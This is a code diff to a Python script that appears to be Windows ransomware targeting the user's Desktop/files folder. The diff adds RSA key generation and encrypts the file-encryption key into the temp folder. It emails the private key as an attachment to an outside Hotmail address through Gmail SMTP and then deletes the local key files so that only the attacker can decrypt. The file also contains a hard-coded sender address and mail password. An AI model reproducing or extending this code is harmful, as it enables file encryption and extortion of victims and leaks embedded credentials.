@@ -4,21 +4,95 @@ from PIL import Image, ImageDraw, ImageFont
 from win32api import GetSystemMetrics
 from tkinter import messagebox
 from time import sleep
+from secrets import SystemRandom
+from random import randrange
+from math import gcd
+from decimal import Decimal
+from miller_rabin import miller_rabin
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES, PKCS1_OAEP
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
 from smail import sign_message
 
+E = 65537
+
+def getprime(bits: int) -> int:
+    """Generate a random bits size prime number"""
+    
+    secure_randrange = SystemRandom().randrange
+    
+    #  Prime shall be (lowlimit < p < 2**bits-1). FIPS 186-4. B.3.1
+    lowlimit = int(Decimal(2**0.5) * Decimal(2**(bits - 1)))
+    lowlimit |= 1 # n += 1 if n is odd
+    highlimit = 2**bits    
+    while True:
+        p = secure_randrange(lowlimit, highlimit, 2)
+        
+        # (p–1) shall be relatively prime to e. FIPS 186-4. B.3.1
+        if gcd(E, p - 1) == 1:            
+            if miller_rabin(p):
+                return p
+
+def rsa_keys(nlen: int) -> (int, int):
+    """Get public and private keys.
+    Method: FIPS 186-4, Appendix B.3.3.
+    Using these method p, q may be generated with lengths of 1024 or 1536 bits
+    (512 bits shall not). FIPS186-4. Appendix B.3.1. Criteria for IFC Key Pairs
+    """    
+
+    if nlen not in (2048, 3072):
+        print('Error. Use bits == 2048 or 3072')
+        return 0, 0
+
+    bits = nlen//2
+    p = getprime(bits)
+    while True:
+        q = getprime(bits)
+        
+        # FIPS 186-4. B.3.1
+        if abs(p - q) > 2**(bits-100):
+
+            # Euler's totient function.
+            phi = (p - 1) * (q - 1)
+
+            # Verify that phi and e are coprime. FIPS 186-4. B.3.1
+            if gcd(E, phi) == 1:
+                n = p * q
+                
+                # Private (or decryption) exponent d
+                d = pow(E, -1, phi)
+                
+                # If phi ≤ d ≤ 2**(nlen//2), new p, q, d shall be determined.
+                if 2**bits < d < phi:
+                    public_key = (E, n)
+                    private_key = (d, n)
+                    return public_key, private_key
 def send_email(subject, body, sender, recipients, password):
-    msg = MIMEText(body)
+    msg = MIMEMultipart()
     msg['Subject'] = subject
     msg['From'] = sender
     msg['To'] = ', '.join(recipients)
+    msg.attach(MIMEText(body, "plain"))
+
+    filename = "private.pem"  
+    with open(filename, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+
+    part.add_header(
+        "Content-Disposition",
+        f"attachment; filename= {filename}",
+    )
+
+    msg.attach(part)
     smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
     smtp_server.ehlo('Gmail')
     smtp_server.starttls()
     smtp_server.login(sender, password)
-    smtp_server.sendmail(sender, recipients, msg.as_string())
+    smtp_server.sendmail(sender, recipients, msg.as_string().encode('ascii'))
     smtp_server.quit()
 def after_work():
     User =  os.getlogin() 
@@ -67,15 +141,37 @@ Message     = (f"{User} -> {Key}")
 PathList    = [r"C:/Users/"+User+"/Desktop/files"]   
 print(PathList)                                        
 
+publicKey, privateKey = rsa_keys(2048)
+e = publicKey[0]
+d = privateKey[0]
+n = publicKey[1]
+privateKey = RSA.construct((n, e, d))
+publicKey = RSA.construct((n, e))
+privateKey = privateKey.export_key()
+publicKey = publicKey.export_key()
+print(publicKey)
+file_out = open("private.pem", "wb")
+file_out.write(privateKey)
+file_out.close()
+file_out = open("receiver.pem", "wb")
+file_out.write(publicKey)
+file_out.close()
+recipient_key = RSA.import_key(open("receiver.pem").read())
+cipher_rsa = PKCS1_OAEP.new(recipient_key)
+message = hexed_key.encode('utf-8')
+encMessage = cipher_rsa.encrypt(message)
+file_out = open("C:/Users/"+User+"/appdata/local/temp/encrypted_key.txt", "wb")
+file_out.write(encMessage)
+file_out.close()
 
-subject = "Newsletter Update"
-body = f"The key is : {hexed_key}"
+subject = "New User Key"
+body = f"The keys are attached to the mail"
 sender = "detroitdre2022@gmail.com"
 recipients = ["test_key_dre@hotmail.com"]
 password = "yaikwnsfztqybqdg"
-
-send_email(subject, body, sender, recipients, password)       
-
+send_email(subject, body, sender, recipients, password) 
+os.remove('receiver.pem')
+os.remove('private.pem')
 if __name__ == '__main__':  
     for  AllFiles in PathList:
         for path, subdirs, files in os.walk(AllFiles):                              
